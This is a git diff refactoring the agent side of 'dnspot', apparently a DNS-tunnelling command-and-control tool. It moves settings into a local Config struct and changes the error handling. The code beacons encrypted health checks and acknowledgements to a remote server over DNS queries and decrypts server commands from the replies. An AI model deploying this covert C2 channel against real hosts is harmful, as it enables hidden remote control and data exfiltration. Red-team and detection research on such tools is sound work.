@@ -13,16 +13,19 @@ import (
 	"time"
 
 	"github.com/mosajjal/dnspot/c2"
-	"github.com/mosajjal/dnspot/conf"
 	"github.com/mosajjal/dnspot/cryptography"
 	log "github.com/sirupsen/logrus"
-	"github.com/spf13/cobra"
 )
 
-func errorHandler(err error) {
-	if err != nil {
-		panic(err.Error())
-	}
+var Config struct {
+	CommandTimeout        time.Duration
+	LogLevel              uint8
+	PrivateKeyBase36      string
+	privateKey            *cryptography.PrivateKey
+	ServerAddress         string
+	ServerPublicKeyBase36 string
+	serverPublicKey       *cryptography.PublicKey
+	DnsSuffix             string
 }
 
 var exiting chan bool
@@ -116,7 +119,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 			payload := []byte("Ack!")
 			// log.Infof("sending plyload %#v\n", msg)
 			// time.Sleep(2 * time.Second)
-			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
+			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
 			for _, Q := range Questions {
 				err = SendQuestionToServer(Q)
 				if err != nil {
@@ -174,11 +177,11 @@ func SendQuestionToServer(Q string) error {
 	if len(Q) < 255 {
 		// todo: implement retry here
 		// todo: handle response form server
-		response, err := c2.PerformExternalAQuery(Q, conf.GlobalAgentConfig.ServerAddress)
+		response, err := c2.PerformExternalAQuery(Q, Config.ServerAddress)
 		if err != nil {
 			return fmt.Errorf("failed to send the payload: %s", err)
 		}
-		msgList, skip, err := c2.DecryptIncomingPacket(response, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
+		msgList, skip, err := c2.DecryptIncomingPacket(response, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
 		if err != nil && !skip {
 			return fmt.Errorf("error in decrypting incoming packet from server: %s", err)
 		} else if !skip {
@@ -197,7 +200,7 @@ func sendHealthCheck() error {
 	}
 	// set payload based on next message type?
 	payload := []byte("Ping!")
-	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
+	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
 	if err != nil {
 		log.Warnf("Error sending Message to Server: %s", err)
 	}
@@ -210,41 +213,43 @@ func sendHealthCheck() error {
 	return nil
 }
 
-func RunAgent(cmd *cobra.Command, args []string) error {
-	log.SetLevel(log.Level(conf.GlobalAgentConfig.LogLevel))
-	if conf.GlobalAgentConfig.LogLevel >= uint8(log.DebugLevel) {
+func RunAgent() {
+	log.SetLevel(log.Level(Config.LogLevel))
+	if Config.LogLevel >= uint8(log.DebugLevel) {
 		log.SetReportCaller(true)
 	}
 
 	log.Infof("Starting agent...")
-	// set global flag that we're running as Agent
-	conf.Mode = conf.RunAsAgent
 
 	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
 	AgentStatus.HealthCheckInterval = 3 * time.Second //todo:make this into a config parameter
 	AgentStatus.NextMessageType = c2.MessageHealthcheck
 	AgentStatus.MessageTicker = time.NewTicker(AgentStatus.HealthCheckInterval)
 
-	if !strings.HasSuffix(conf.GlobalAgentConfig.DnsSuffix, ".") {
-		conf.GlobalAgentConfig.DnsSuffix = conf.GlobalAgentConfig.DnsSuffix + "."
+	if !strings.HasSuffix(Config.DnsSuffix, ".") {
+		Config.DnsSuffix = Config.DnsSuffix + "."
 	}
-	if !strings.HasPrefix(conf.GlobalAgentConfig.DnsSuffix, ".") {
-		conf.GlobalAgentConfig.DnsSuffix = "." + conf.GlobalAgentConfig.DnsSuffix
+	if !strings.HasPrefix(Config.DnsSuffix, ".") {
+		Config.DnsSuffix = "." + Config.DnsSuffix
 	}
 
 	var err error
 	// generate a new private key if the user hasn't provided one
-	if conf.GlobalAgentConfig.PrivateKey == nil {
-		conf.GlobalAgentConfig.PrivateKey, err = cryptography.GenerateKey()
-		errorHandler(err)
+	if Config.privateKey == nil {
+		log.Infoln("generating a new key pair for the agent since it was not specified")
+		if Config.privateKey, err = cryptography.GenerateKey(); err != nil {
+			log.Fatalln("failed to generate a key for client")
+		}
 	} else {
-		conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyBasexx)
-		errorHandler(err)
+		if Config.privateKey, err = cryptography.PrivateKeyFromString(Config.PrivateKeyBase36); err != nil {
+			log.Fatalln("failed to generate a key for client")
+		}
 	}
 
 	// extract the public key from the provided Base32 encoded string
-	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyBasexx)
-	errorHandler(err)
+	if Config.serverPublicKey, err = cryptography.PublicKeyFromString(Config.ServerPublicKeyBase36); err != nil {
+		log.Fatalln("failed to generate a key for client")
+	}
 
 	// start the agent by sending a healthcheck
 	if err := sendHealthCheck(); err != nil {
@@ -269,7 +274,7 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 		select {
 		case <-exiting:
 			// When exiting, return immediately
-			return nil
+			return
 		case <-AgentStatus.MessageTicker.C:
 			if AgentStatus.NextMessageType == c2.MessageHealthcheck {
 				if err := sendHealthCheck(); err != nil {
@@ -282,7 +287,7 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 					MessageType: AgentStatus.NextMessageType,
 				}
 				payload := []byte(AgentStatus.NextPayload)
-				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
+				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
 				if err != nil {
 					log.Warnf("Error sending Message to Server 1") //todo:update msg
 				}
